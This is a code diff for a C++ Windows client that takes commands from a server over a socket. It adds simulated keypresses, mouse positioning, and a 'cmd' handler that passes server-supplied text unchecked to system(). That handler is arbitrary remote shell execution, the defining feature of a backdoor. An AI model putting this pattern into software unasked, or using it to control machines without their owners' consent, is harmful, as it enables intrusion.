@@ -1,10 +1,12 @@
+#include "Commands.h"
+#include "Online.h"
+
 #include <string>
 #include <vector>
 #include <regex>
 #include <thread>
 #include <stdio.h>
-
-#include "Online.h"
+#include <Windows.h>
 
 using namespace std;
 
@@ -12,6 +14,7 @@ using namespace std;
 int doTask(SOCKET& server, int clientID, int commandID, string command, string commandArgs) // поток для выполнения команды, передаем server - сам сервер и другие параметры
 {
 	string msg;
+	puts("started doing task");
 
 	if (command == "mystify") // проверка на команду
 	{
@@ -37,6 +40,7 @@ int doTask(SOCKET& server, int clientID, int commandID, string command, string c
 	}
 	else if (command == "switch")
 	{
+		puts("started doing switch command");
 		try
 		{
 			keybd_event(VK_MENU, NULL, NULL, NULL);
@@ -67,6 +71,138 @@ int doTask(SOCKET& server, int clientID, int commandID, string command, string c
 			}
 		}
 	}
+	else if (command == "press")
+	{
+		char key = commandArgs.c_str()[0];
+		try
+		{
+			keybd_event(VkKeyScan(key) & 0xff, NULL, NULL, NULL);
+			keybd_event(VkKeyScan(key) & 0xff, NULL, KEYEVENTF_KEYUP, NULL);
+
+			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "success";
+			if (sendMessage(server, msg.c_str()) == 0)
+			{
+				puts("Failed sending command response");
+				return 0;
+			}
+		}
+		catch (const exception&)
+		{
+			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "fail";
+			if (sendMessage(server, msg.c_str()) == 0)
+			{
+				puts("Failed sending command response");
+				return 0;
+			}
+		}
+	}
+	else if (command == "setmouse")
+	{
+		vector<string> pos;
+		try
+		{
+			try
+			{
+				pos = split(commandArgs, ",");
+			}
+			catch (const std::exception&)
+			{
+				msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "invalid_syntax";
+				if (sendMessage(server, msg.c_str()) == 0)
+				{
+					puts("Failed sending command response");
+					return 0;
+				}
+			}
+			SetCursorPos(stoi(pos[0]), stoi(pos[1]));
+
+			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "success";
+			if (sendMessage(server, msg.c_str()) == 0)
+			{
+				puts("Failed sending command response");
+				return 0;
+			}
+		}
+		catch (const exception&)
+		{
+			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "fail";
+			if (sendMessage(server, msg.c_str()) == 0)
+			{
+				puts("Failed sending command response");
+				return 0;
+			}
+		}
+	}
+	else if (command == "movemouse")
+	{
+	vector<string> pos;
+	POINT p;
+	try
+	{
+		try
+		{
+			pos = split(commandArgs, ",");
+		}
+		catch (const std::exception&)
+		{
+			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "invalid_syntax";
+			if (sendMessage(server, msg.c_str()) == 0)
+			{
+				puts("Failed sending command response");
+				return 0;
+			}
+		}
+		GetCursorPos(&p);
+		SetCursorPos(p.x + stoi(pos[0]), p.y + stoi(pos[1]));
+
+		msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "success";
+		if (sendMessage(server, msg.c_str()) == 0)
+		{
+			puts("Failed sending command response");
+			return 0;
+		}
+	}
+	catch (const exception&)
+	{
+		msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "fail";
+		if (sendMessage(server, msg.c_str()) == 0)
+		{
+			puts("Failed sending command response");
+			return 0;
+		}
+	}
+	}
+	else if (command == "cmd")
+	{
+		try
+		{
+			system(commandArgs.c_str());
+			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "success";
+			if (sendMessage(server, msg.c_str()) == 0)
+			{
+				puts("Failed sending command response");
+				return 0;
+			}
+		}
+		catch (const exception&)
+		{
+			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "fail";
+			if (sendMessage(server, msg.c_str()) == 0)
+			{
+				puts("Failed sending command response");
+				return 0;
+			}
+		}
+	}
+	else
+	{
+		msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "unknown_command";
+		if (sendMessage(server, msg.c_str()) == 0)
+		{
+			puts("Failed sending command response");
+			return 0;
+		}
+	}
 }
 
 int doSystemTask(SOCKET& server, string command, string commandArgs)
@@ -87,7 +223,8 @@ int doSystemTask(SOCKET& server, string command, string commandArgs)
 	}
 }
 
-vector<string> split(const string& input, const string& regex) {
+vector<string> split(const string& input, const string& regex) 
+{
 	std::regex re(regex);
 	std::sregex_token_iterator first{ input.begin(), input.end(), re, -1 }, last;
 	return { first, last };
@@ -119,10 +256,11 @@ int parseCmd(SOCKET& server, int clientID, string cmd) // C$clientID$commandID$s
 	static const regex commandRegex(R"(\d+\$.+\$.+)");
 	static const regex systemCommandRegex(R"(SYS\$.+)");
 
-	data = cmd.substr(0, cmd.length() - 2);
+	data = cmd.substr(0, cmd.length() - 1);
 
 	if (regex_match(data, commandRegex))
 	{
+		puts("command regex!");
 		args = split(data, "\\$");
 
 		commandID = atoi(args[0].c_str());
